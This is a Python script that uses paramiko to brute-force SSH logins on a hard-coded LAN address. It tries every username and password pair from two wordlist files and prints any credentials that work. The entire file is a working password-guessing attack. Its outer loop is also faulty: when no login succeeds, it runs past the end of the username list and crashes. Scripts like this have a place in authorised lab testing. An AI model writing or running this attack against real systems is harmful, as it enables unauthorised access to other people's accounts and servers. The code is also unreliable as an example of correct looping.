import paramiko
import time

password_list=[]
username_list=[]
correct_password = ""
correct_username = ""
host_ip = "192.168.43.100"

start = time.time() #start time

#Get the username & password list
print('Reading username and password files...')
try:
    with open("100pass.txt") as passwords:
        password_list = passwords.readlines()
        password_list = [p.strip() for p in password_list]
    
    with open("usernames.txt") as usernames:
        username_list = usernames.readlines()
        username_list = [u.strip() for u in username_list]
            
except IOError:
    print("File not found")

#attempt connection
print('Attempt dictionary attack...')

index_p = 0; #move through while loop for password
index_u = 0; #move through while loop for username

while not correct_username or index_u < len(username_list):
    username = username_list[index_u]
    while not correct_password and index_p < len(password_list):
        password = password_list[index_p]
    
        try:
            ssh_client = paramiko.client.SSHClient()
            ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh_client.connect(hostname=host_ip, username=username,password=password)
            correct_password = password
            correct_username = username
            print('Success! [%s:%s]' %(correct_username,correct_password))
        
        except paramiko.AuthenticationException: #for wrong password
            print('Failed [%s:%s]' %(username,password))
        except Exception as e: #any other exceptions
            print('Error %s: username: %s, password: %s' %(e, username, password))
        finally:
            index_p+=1
            ssh_client.close();
    index_p=0
    index_u+=1
    
if not correct_password:
    print('Dictionary attack failed')
else:
    print('Dictionary attack succeeded with [%s:%s]' %(correct_username,correct_password))

end = time.time()
# process_time = end - start
print("%d seconds" %(end - start))
